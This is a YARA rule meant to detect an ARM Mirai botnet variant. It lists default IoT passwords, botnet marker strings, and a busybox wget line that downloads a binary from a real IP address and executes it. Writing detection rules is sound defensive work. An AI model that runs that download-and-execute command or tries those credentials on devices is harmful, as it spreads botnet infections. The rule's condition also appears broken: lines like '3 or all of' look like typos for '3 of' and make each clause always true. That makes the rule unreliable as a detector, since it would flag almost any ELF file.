rule Linux_ARM_Mirai_Variant_2022_03_16 {
    meta:
        description = "Detects new ARM Mirai variant"
        author = "Mehmet Ali Kerimoglu a.k.a. CYB3RMX"
        date = "2022-03-16"
        hash1 = "02814338c6e2d5bd1c1f729c7b03451df5e19023a96fc7acf7052174e17457b7"
    strings:
        $path1 = "/var/Kylin" wide ascii
        $path2 = "/var/Challenge" wide ascii
        $path3 = "/var/Sofia" wide ascii
        $path4 = "/GMHDVR" wide ascii
        $path5 = "/proc/net/tcp" wide ascii
        $path6 = "/anko-app/" wide ascii
        $pass1 = "a1sev5y7c39k" wide ascii
        $pass2 = "admin@123" wide ascii
        $pass3 = "HUAWEI" wide ascii
        $pass4 = "wuhanyatelan" wide ascii
        $pass5 = "ipcam_rt5350" wide ascii
        $pass6 = "QwestM0dem" wide ascii
        $botnet1 = "/bin/busybox BOTNET" wide ascii
        $botnet2 = "BOTNET: applet not found" wide ascii
        $botnet3 = "im stealing ur bots bro" wide ascii
        $botnet4 = "/bin/busybox wget -g 103.136.42.135 -l /tmp/skere -r /Cronmips; /bin/busybox chmod 777 * /tmp/skere; /tmp/skere huawei;rm rf Cronmips" wide ascii
    condition:
        uint16(0) == 0x457f and ((3 or all of ($path*)) and (4 or all of ($pass*)) and (2 or all of ($botnet*)))
}